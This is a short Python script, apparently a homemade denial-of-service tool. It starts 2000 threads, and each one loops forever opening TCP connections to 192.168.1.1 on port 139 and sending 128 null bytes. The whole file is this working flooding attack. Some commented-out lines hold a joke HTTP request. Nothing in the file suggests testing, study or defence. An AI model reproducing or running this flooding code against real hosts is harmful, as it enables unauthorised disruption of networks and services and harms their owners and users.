import socket
from threading import Thread


def dos():
    host = "192.168.1.1"
    ip = host
    port = 139

    while True:
        #print('enter')
        mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            mysocket.connect((ip, port))
            #mysocket.send(str.encode("GET " + "haste mal 3 fufzig" + "HTTP/1.1 \r\n"))
            #mysocket.sendto(str.encode("GET " + "haste mal 3 fufzig" + "HTTP/1.1 \r\n"), (ip, port))

            mysocket.send(bytes(128))
            mysocket.sendto(bytes(128), (ip, port))

        except socket.error:
            print("error")
        mysocket.close()

for i in range(2000):
    t = Thread(target=dos)
    t.start()
